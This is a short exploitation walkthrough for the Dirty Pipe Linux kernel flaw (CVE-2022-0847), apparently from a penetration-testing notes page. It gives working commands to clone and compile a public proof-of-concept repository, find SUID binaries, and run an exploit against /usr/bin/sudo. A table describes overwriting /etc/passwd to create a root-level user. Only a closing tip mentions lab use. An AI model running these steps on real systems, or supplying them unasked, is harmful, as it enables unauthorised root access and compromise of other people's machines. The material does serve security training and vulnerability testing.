## Dirty Pipe (CVE-2022-0847)

[CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847) is a Linux kernel vulnerability affecting versions **5.8 through 5.17**. It allows an unprivileged user to write to arbitrary read-only files by abusing a flaw in how pipe buffers handle memory flags — effectively bypassing all file permission checks.

> Notable scope: Android devices running affected kernel versions are also vulnerable.

### Verify the kernel version

```shell
uname -r
```

### Download and compile the PoC

```shell
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
```

Two exploits are produced:

| Exploit | Method | Effect |
| ------- | ------ | ------ |
| `exploit-1` | Overwrites `/etc/passwd` | Adds a root-level user or removes the root password |
| `exploit-2` | Injects into a SUID binary at runtime | Executes arbitrary code with the binary's elevated privileges |

### Using `exploit-2` — SUID binary injection

First, identify available SUID binaries:

```shell
find / -perm -4000 2>/dev/null
```

Then pass one as the target:

```shell
./exploit-2 /usr/bin/sudo
```

> 💡 `exploit-2` is generally the safer choice in lab environments — it doesn't permanently modify system files like `/etc/passwd`, making it easier to clean up after the exercise.
